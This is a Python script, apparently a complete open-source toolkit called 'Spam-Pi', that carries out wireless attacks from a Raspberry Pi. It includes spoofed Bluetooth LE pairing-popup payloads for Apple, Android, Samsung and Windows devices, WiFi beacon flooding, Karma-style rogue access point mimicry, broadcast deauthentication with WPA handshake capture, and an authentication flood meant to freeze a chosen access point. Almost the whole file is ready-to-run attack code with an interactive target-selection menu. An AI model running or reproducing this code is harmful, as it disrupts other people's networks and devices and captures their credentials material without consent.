#!/usr/bin/env python3
"""
Spam-Pi: Elite Wireless Attack & Recon Suite for Raspberry Pi
Copyright (c) 2024 Spam-Pi Contributors
Licensed under the MIT License
"""

import os
import sys
import time
import random
import subprocess
import threading
from scapy.all import (
    Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, 
    Dot11Deauth, sniff, Dot11ProbeReq, EAPOL, Dot11Auth, wrpcap
)

# --- Configuration & Logging ---
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
HANDSHAKE_FILE = os.path.join(LOG_DIR, "handshakes.pcap")
PROBE_LOG = os.path.join(LOG_DIR, "probes.log")

# --- BLE Payloads ---
APPLE_DEVICES = {
    "AirPods": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AirPods Pro": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0E, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AirPods Max": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0A, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AppleTV Setup": [0x1E, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC1, 0x01, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    "AirTag / Find My": [0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
}
MICROSOFT_SWIFT = [0x1E, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80] + [0x00]*24
ANDROID_FAST = [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x45]
SAMSUNG_QUICK = [0x18, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x61, 0x73, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
ALL_BLE_PAYLOADS = list(APPLE_DEVICES.values()) + [ANDROID_FAST, SAMSUNG_QUICK, MICROSOFT_SWIFT]

# --- WiFi Data ---
COMMON_SSIDS = ["Free Public WiFi", "Starbucks WiFi", "Xfinitywifi", "eduroam", "Guest WiFi", "FBI Surveillance Van #4"]

# --- Device Detection ---
def get_hci_devices():
    devices = []
    try:
        result = subprocess.run(['hciconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if line.startswith('hci'):
                devices.append({'id': line.split(':')[0], 'manufacturer': 'Unknown'})
        detailed = subprocess.run(['hciconfig', '-a'], capture_output=True, text=True)
        current_dev = None
        for line in detailed.stdout.split('\n'):
            line = line.strip()
            if line.startswith('hci'): current_dev = line.split(':')[0]
            elif 'Manufacturer:' in line and current_dev:
                mfr = line.split('Manufacturer:')[1].strip()
                for dev in devices:
                    if dev['id'] == current_dev: dev['manufacturer'] = mfr
    except: pass
    return devices

def get_wifi_devices():
    interfaces = []
    try:
        with open('/proc/net/dev', 'r') as f:
            for line in f.readlines()[2:]:
                if ':' in line:
                    ifname = line.split(':')[0].strip()
                    if any(ifname.startswith(p) for p in ['wlan', 'wl', 'wlp']):
                        interfaces.append({'id': ifname, 'manufacturer': 'Unknown'})
        try:
            result = subprocess.run(['airmon-ng'], capture_output=True, text=True)
            for i, dev in enumerate(interfaces):
                for line in result.stdout.split('\n'):
                    if dev['id'] in line:
                        parts = [p for p in line.split(' ') if p]
                        if len(parts) >= 3: interfaces[i]['manufacturer'] = " ".join(parts[2:])
        except: pass
    except: pass
    return interfaces

# --- BLE Class ---
class PiBLESpan:
    def __init__(self, hci_interface):
        self.hci_interface = hci_interface
        self.is_running = False
        self.thread = None

    def run_hcitool(self, ogf, ocf, params):
        params_hex = " ".join([f"{x:02x}" for x in params])
        cmd = f"hcitool -i {self.hci_interface} cmd 0x{ogf:02x} 0x{ocf:04x} {params_hex}"
        try:
            subprocess.run(cmd.split(), check=True, capture_output=True)
            return True
        except: return False

    def set_adv_enable(self, enable): return self.run_hcitool(0x08, 0x000A, [1 if enable else 0])
    def set_adv_params(self): return self.run_hcitool(0x08, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
    def set_adv_data(self, data):
        payload = [len(data)] + data + [0] * (31 - len(data))
        return self.run_hcitool(0x08, 0x0008, payload)

    def spam_task(self, payload, cycle=False):
        self.set_adv_enable(False)
        self.set_adv_params()
        if not cycle: self.set_adv_data(payload)
        while self.is_running:
            if cycle:
                for p in ALL_BLE_PAYLOADS:
                    if not self.is_running: break
                    self.set_adv_data(p)
                    self.set_adv_enable(True)
                    time.sleep(0.5)
                    self.set_adv_enable(False)
            else:
                self.set_adv_enable(True)
                time.sleep(1)

    def scan_task(self):
        print(f"[*] Scanning for BLE devices on {self.hci_interface}...")
        subprocess.run(['hciconfig', self.hci_interface, 'up'], capture_output=True)
        proc = subprocess.Popen(['hcitool', '-i', self.hci_interface, 'lescan', '--duplicates', '--passive'], 
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        try:
            for line in proc.stdout:
                if not self.is_running: break
                print(f"  [BLE] {line.strip()}")
        finally: proc.terminate()

    def start_spam(self, payload=None, cycle=False):
        self.is_running = True
        self.thread = threading.Thread(target=self.spam_task, args=(payload, cycle), daemon=True)
        self.thread.start()

    def start_scan(self):
        self.is_running = True
        self.thread = threading.Thread(target=self.scan_task, daemon=True)
        self.thread.start()

    def stop(self):
        self.is_running = False
        if self.thread: self.thread.join(timeout=1)
        self.set_adv_enable(False)

# --- WiFi Class ---
class WiFiSpammer:
    def __init__(self, interface):
        self.interface = interface
        self.is_running = False
        self.is_karma = False
        self.discovered_aps = {}
        self.probes = set()
        self.active_beacons = set(COMMON_SSIDS)

    def set_monitor(self, enable=True):
        try:
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
            subprocess.run(['iw', self.interface, 'set', 'monitor', 'none' if enable else 'managed'], check=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
            return True
        except: return False

    def channel_hopper(self):
        while self.is_running:
            for ch in range(1, 14):
                if not self.is_running: break
                subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(ch)], capture_output=True)
                time.sleep(1)

    def packet_callback(self, pkt):
        # AP Discovery
        if pkt.haslayer(Dot11Beacon):
            b = pkt[Dot11].addr2
            try: s = pkt[Dot11Elt].info.decode()
            except: s = "<Hidden>"
            if b not in self.discovered_aps:
                self.discovered_aps[b] = s
                print(f"  [AP] {b} - {s}")
        
        # Probe & Karma
        if pkt.haslayer(Dot11ProbeReq):
            if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].ID == 0:
                s = pkt[Dot11Elt].info.decode()
                c = pkt[Dot11].addr2
                if s and (c, s) not in self.probes:
                    self.probes.add((c, s))
                    with open(PROBE_LOG, "a") as f: f.write(f"{time.ctime()} - Client {c} -> '{s}'\n")
                    print(f"  [PROBE] Client {c} looking for '{s}'")
                    if self.is_karma:
                        print(f"  [KARMA] Adopting SSID: '{s}'")
                        self.active_beacons.add(s)

        # Handshake Capture
        if pkt.haslayer(EAPOL):
            b = pkt[Dot11].addr3
            print(f"  [!] CAPTURED EAPOL HANDSHAKE for {b}!")
            wrpcap(HANDSHAKE_FILE, pkt, append=True)

    def deauth_task(self, bssid):
        pkt = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        while self.is_running: sendp(pkt, iface=self.interface, count=100, inter=0.1, verbose=False)

    def auth_flood_task(self, bssid):
        print(f"[*] Starting Auth Flood against {bssid}...")
        while self.is_running:
            smac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
            pkt = RadioTap() / Dot11(addr1=bssid, addr2=smac, addr3=bssid) / Dot11Auth(algo=0, seqnum=1, status=0)
            sendp(pkt, iface=self.interface, count=10, verbose=False)

    def beacon_task(self):
        while self.is_running:
            for ssid in list(self.active_beacons):
                smac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
                pkt = RadioTap() / Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=smac, addr3=smac) / Dot11Beacon() / Dot11Elt(ID='SSID', info=ssid)
                sendp(pkt, iface=self.interface, count=1, verbose=False)

    def start_recon(self, karma=False):
        self.is_running = True
        self.is_karma = karma
        self.set_monitor(True)
        threading.Thread(target=self.channel_hopper, daemon=True).start()
        threading.Thread(target=self.beacon_task, daemon=True).start()
        threading.Thread(target=lambda: sniff(iface=self.interface, prn=self.packet_callback, stop_filter=lambda x: not self.is_running), daemon=True).start()

    def start_attack(self, bssid, mode="deauth"):
        self.is_running = True
        self.set_monitor(True)
        if mode == "deauth": threading.Thread(target=self.deauth_task, args=(bssid,), daemon=True).start()
        elif mode == "auth": threading.Thread(target=self.auth_flood_task, args=(bssid,), daemon=True).start()
        threading.Thread(target=lambda: sniff(iface=self.interface, prn=self.packet_callback, stop_filter=lambda x: not self.is_running), daemon=True).start()

    def stop(self):
        self.is_running = False
        self.set_monitor(False)

# --- Main App ---
def main():
    if os.getuid() != 0:
        print("[!] Must be run as root (sudo).")
        sys.exit(1)

    print("--- Spam-Pi ELITE SUITE ---")
    bt_devs = get_hci_devices()
    wifi_devs = get_wifi_devices()
    hci_id = bt_devs[0]['id'] if bt_devs else None
    wifi_id = wifi_devs[0]['id'] if wifi_devs else None

    while True:
        print("\n--- ELITE MENU ---")
        print("1. Proximity Spam (Apple/AirTag/Android/Samsung/Windows)")
        print("2. Beacon Flooding (Common + Multi-Channel)")
        print("3. Recon & Karma (Sniff + Dynamic Beacon Response)")
        print("4. WiFi Deauther & Handshake Snatcher")
        print("5. WiFi Auth Flooder (Freeze AP)")
        print("6. Peripheral: MouseJack/NRF Spam")
        print("0. Exit")
        
        choice = input("\nChoice: ")
        ble = PiBLESpan(hci_id) if hci_id else None
        wifi = WiFiSpammer(wifi_id) if wifi_id else None

        try:
            if choice == '1' and ble:
                ble.start_spam(cycle=True)
            elif choice == '2' and wifi:
                wifi.start_recon(karma=False)
            elif choice == '3' and wifi:
                print("[*] Karma Mode Active: Listening and mimicking nearby devices.")
                wifi.start_recon(karma=True)
            elif choice == '4' and wifi:
                wifi.start_recon(karma=False)
                time.sleep(5)
                if wifi.discovered_aps:
                    for i, (b, s) in enumerate(wifi.discovered_aps.items()): print(f"{i+1}. {b} - {s}")
                    idx = int(input("Target: ")) - 1
                    target = list(wifi.discovered_aps.keys())[idx]
                    wifi.stop(); time.sleep(1)
                    wifi.start_attack(target, mode="deauth")
            elif choice == '5' and wifi:
                wifi.start_recon(karma=False)
                time.sleep(5)
                if wifi.discovered_aps:
                    for i, (b, s) in enumerate(wifi.discovered_aps.items()): print(f"{i+1}. {b} - {s}")
                    idx = int(input("Target: ")) - 1
                    target = list(wifi.discovered_aps.keys())[idx]
                    wifi.stop(); time.sleep(1)
                    wifi.start_attack(target, mode="auth")
            elif choice == '0': sys.exit(0)

            print("\n[*] ELITE TASK ACTIVE! Press Ctrl+C to return to menu.")
            while True: time.sleep(1)
        except KeyboardInterrupt:
            if ble: ble.stop()
            if wifi: wifi.stop()
            print("\n[*] Operation Interrupted.")

if __name__ == "__main__":
    main()
